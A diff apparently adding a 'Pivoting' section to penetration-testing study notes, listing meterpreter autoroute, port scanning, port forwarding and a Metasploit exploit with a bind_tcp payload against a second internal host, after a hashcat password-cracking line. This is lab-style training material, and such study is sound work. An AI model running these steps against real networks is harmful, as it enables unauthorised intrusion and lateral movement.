@@ -746,4 +746,43 @@ hashcat -m 1800 -a 3 /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.
 cat .hashcat/hashcat.potfile
 ```
 
+### Pivoting
+```
+meterpreter > ipconfig
+meterpreter > arp
+```
+- Target only has one interface.
+- `arp` shows the presence of other systems that we cannot reach (ping).
+
+```
+meterpreter > run autoroute -s <subnet>
+meterpreter > run autoroute -p
+```
+- Use CIDR notation e.g. `10.0.16.0/20`.
+
+```
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <ip2>
+```
+- `<ip2>` is target 2.
+
+```
+meterpreter > portfwd add -l <local_port> -p <remote_port> -r <ip2>
+meterpreter > portfwd list
+```
+
+```
+netstat -an | grep LISTEN
+
+nmap -Pn -sV -p<local_port> localhost
+```
+
+```
+use exploit/windows/http/badblue_passthru
+set RHOSTS <ip2>
+set payload windows/meterpreter/bind_tcp
+```
+- Need `bind_tcp` because target 1 cannot forward reverse connections back to Kali.
+- `LPORT` here will be the port that target 2 listens on.
+
 ## Social Engineering
